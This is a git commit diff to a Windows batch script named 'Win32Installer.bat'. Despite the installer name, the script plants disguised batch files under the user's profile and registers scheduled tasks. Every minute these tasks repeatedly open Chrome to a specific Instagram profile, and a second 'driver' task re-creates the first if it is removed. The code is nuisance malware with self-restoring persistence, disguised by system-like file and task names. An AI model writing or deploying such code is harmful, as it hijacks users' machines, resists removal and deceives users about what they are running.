601b32a8f60df748650f7cd775c12b03a0405dfe
WAP Industries <141229412+WAP-Industries@users.noreply.github.com>
2023-09-24 00:04:59 +0800

    Add files via upload

--- Win32Installer.bat
+++ Win32Installer.bat
@@ -1,19 +1,57 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
-set "folder=%USERPROFILE%\Applications"
-mkdir %folder%
-set "filename=%folder%\Win32Helper.bat"
+set "taskfolder=%USERPROFILE%\System"
+set "taskname=Win32Helper.bat"
+set "taskfile=%taskfolder%\%taskname%"
+set "driverfile=%taskfolder%\Win32Handler.bat"
+set "driverhost=%taskfolder%\Win32Host.bat"
 
-echo @echo off > "%filename%"
-echo set /a i=0 >> "%filename%"
-echo :redir >> "%filename%""
-echo    start chrome.exe "https://www.instagram.com/jeremiahchai/" >> "%filename%"
-echo    set /a i=%%i%%+1 >> "%filename%"
-echo    if %%i%% lss 10 ( >> "%filename%"
-echo        call :redir >> "%filename%"
-echo    ) >> "%filename%"
+set "copyfolder=%USERPROFILE%\Applications"
+set "copyfile=%taskfolder%\%taskfilename%"
 
-schtasks /create /tn shokam /tr "%filename%" /sc minute /mo 1 /st 00:00:00 /f
+set "schname=shokam"
+
+
+goto :MAIN
+
+
+:CreateTaskFile
+    mkdir "%taskfolder%"
+
+    type nul > "%taskfile%"
+    echo @echo off >> "%taskfile%"
+    echo cd ^/ >> "%taskfile%"
+    echo set /a i=0 >> "%taskfile%"
+    echo :redir >> "%taskfile%""
+    echo    start chrome.exe "https://www.instagram.com/jeremiahchai/" >> "%taskfile%"
+    echo    set /a i=%%i%%+1 >> "%taskfile%"
+    echo    if %%i%% lss 10 ( >> "%taskfile%"
+    echo        call :redir >> "%taskfile%"
+    echo    ) >> "%taskfile%"
+    exit /b
+
+
+:CreateTaskDriver
+    type nul > "%driverfile%"
+    echo @echo off >> "%driverfile%"
+    echo cd ^/ >> "%driverfile%"
+    echo schtasks /query /tn "%schname%" ^> nul >> "%driverfile%"
+    echo if %%errorlevel%% neq 0 ( >> "%driverfile%"
+    echo     mkdir "%copyfolder%" >> "%driverfile%"
+    echo     copy /Y "%taskfile%" "%copyfolder%\" >> "%driverfile%"
+    echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f >> "%driverfile%"
+    echo ) >> "%driverfile%"
+    exit /b
+
+
+:MAIN
+    call :CreateTaskFile
+    echo task file created
+
+    call :CreateTaskDriver
+    echo task driver created
+
+    schtasks /create /tn "HostDriverSCJE" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f
 
 endlocal
